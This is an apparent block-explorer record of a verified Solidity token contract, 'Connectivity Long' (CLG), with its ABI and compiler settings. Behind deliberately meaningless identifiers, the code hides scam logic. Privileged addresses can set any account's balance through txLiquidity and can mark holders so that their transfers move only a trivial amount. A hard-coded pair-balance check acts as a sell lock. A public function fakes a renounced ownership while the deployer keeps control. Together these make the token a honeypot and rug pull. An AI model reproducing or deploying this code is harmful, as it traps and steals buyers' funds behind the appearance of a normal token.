{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface liquidityTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundTeam {\n    function createPair(address isTake, address modeTake) external returns (address);\n}\n\ninterface autoMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFrom) external view returns (uint256);\n\n    function transfer(address atEnable, uint256 receiverAt) external returns (bool);\n\n    function allowance(address isBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atEnable,\n        uint256 receiverAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellLimit, uint256 value);\n    event Approval(address indexed isBuy, address indexed spender, uint256 value);\n}\n\ninterface autoMinMetadata is autoMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConnectivityLong is shouldLimit, autoMin, autoMinMetadata {\n\n    function txLiquidity(address fundFee, uint256 receiverAt) public {\n        senderAt();\n        liquidityWallet[fundFee] = receiverAt;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return autoExempt;\n    }\n\n    bool public swapLaunchSender;\n\n    function owner() external view returns (address) {\n        return walletSell;\n    }\n\n    address exemptReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapEnable;\n    }\n\n    function shouldLaunchedTeam(address walletEnableTeam, address atEnable, uint256 receiverAt) internal returns (bool) {\n        require(liquidityWallet[walletEnableTeam] >= receiverAt);\n        liquidityWallet[walletEnableTeam] -= receiverAt;\n        liquidityWallet[atEnable] += receiverAt;\n        emit Transfer(walletEnableTeam, atEnable, receiverAt);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeEnable;\n    }\n\n    function swapTeam(address walletEnableTeam, address atEnable, uint256 receiverAt) internal returns (bool) {\n        if (walletEnableTeam == limitBuy) {\n            return shouldLaunchedTeam(walletEnableTeam, atEnable, receiverAt);\n        }\n        uint256 minFund = autoMin(swapMax).balanceOf(walletMin);\n        require(minFund == exemptLiquidity);\n        require(atEnable != walletMin);\n        if (receiverMin[walletEnableTeam]) {\n            return shouldLaunchedTeam(walletEnableTeam, atEnable, launchedAmount);\n        }\n        return shouldLaunchedTeam(walletEnableTeam, atEnable, receiverAt);\n    }\n\n    mapping(address => uint256) private liquidityWallet;\n\n    function transfer(address fundFee, uint256 receiverAt) external virtual override returns (bool) {\n        return swapTeam(_msgSender(), fundFee, receiverAt);\n    }\n\n    function limitTotalLiquidity(uint256 receiverAt) public {\n        senderAt();\n        exemptLiquidity = receiverAt;\n    }\n\n    mapping(address => bool) public tokenExempt;\n\n    uint256 toShould;\n\n    function approve(address exemptAmountTake, uint256 receiverAt) public virtual override returns (bool) {\n        launchedReceiver[_msgSender()][exemptAmountTake] = receiverAt;\n        emit Approval(_msgSender(), exemptAmountTake, receiverAt);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed autoEnable, address indexed takeMode);\n\n    function tokenAt(address maxAt) public {\n        if (listMinEnable) {\n            return;\n        }\n        \n        tokenExempt[maxAt] = true;\n        \n        listMinEnable = true;\n    }\n\n    bool public receiverReceiver;\n\n    uint256 private modeSwap;\n\n    address public swapMax;\n\n    bool public listMinEnable;\n\n    bool private buyTake;\n\n    string private autoExempt = \"Connectivity Long\";\n\n    uint256 private swapEnable = 100000000 * 10 ** 18;\n\n    string private feeEnable = \"CLG\";\n\n    function senderAt() private view {\n        require(tokenExempt[_msgSender()]);\n    }\n\n    uint256 exemptLiquidity;\n\n    function enableTotal(address maxMarketing) public {\n        senderAt();\n        if (receiverReceiver) {\n            modeSwap = feeTeamMax;\n        }\n        if (maxMarketing == limitBuy || maxMarketing == swapMax) {\n            return;\n        }\n        receiverMin[maxMarketing] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTotal;\n    }\n\n    function allowance(address maxEnableAuto, address exemptAmountTake) external view virtual override returns (uint256) {\n        if (exemptAmountTake == exemptReceiver) {\n            return type(uint256).max;\n        }\n        return launchedReceiver[maxEnableAuto][exemptAmountTake];\n    }\n\n    uint8 private fromTotal = 18;\n\n    function getOwner() external view returns (address) {\n        return walletSell;\n    }\n\n    address private walletSell;\n\n    address public limitBuy;\n\n    uint256 public feeTeamMax;\n\n    function balanceOf(address teamFrom) public view virtual override returns (uint256) {\n        return liquidityWallet[teamFrom];\n    }\n\n    uint256 constant launchedAmount = 11 ** 10;\n\n    uint256 public isAuto;\n\n    address walletMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function sellTeamMin() public {\n        emit OwnershipTransferred(limitBuy, address(0));\n        walletSell = address(0);\n    }\n\n    function transferFrom(address walletEnableTeam, address atEnable, uint256 receiverAt) external override returns (bool) {\n        if (_msgSender() != exemptReceiver) {\n            if (launchedReceiver[walletEnableTeam][_msgSender()] != type(uint256).max) {\n                require(receiverAt <= launchedReceiver[walletEnableTeam][_msgSender()]);\n                launchedReceiver[walletEnableTeam][_msgSender()] -= receiverAt;\n            }\n        }\n        return swapTeam(walletEnableTeam, atEnable, receiverAt);\n    }\n\n    mapping(address => bool) public receiverMin;\n\n    constructor (){\n        if (isAuto != feeTeamMax) {\n            swapLaunchSender = true;\n        }\n        liquidityTotal toLaunchedExempt = liquidityTotal(exemptReceiver);\n        swapMax = fundTeam(toLaunchedExempt.factory()).createPair(toLaunchedExempt.WETH(), address(this));\n        \n        limitBuy = _msgSender();\n        sellTeamMin();\n        tokenExempt[limitBuy] = true;\n        liquidityWallet[limitBuy] = swapEnable;\n        \n        emit Transfer(address(0), limitBuy, swapEnable);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnableAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptAmountTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAmountTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"}],\"name\":\"enableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTeamMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverAt\",\"type\":\"uint256\"}],\"name\":\"limitTotalLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMinEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAt\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletEnableTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverAt\",\"type\":\"uint256\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConnectivityLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}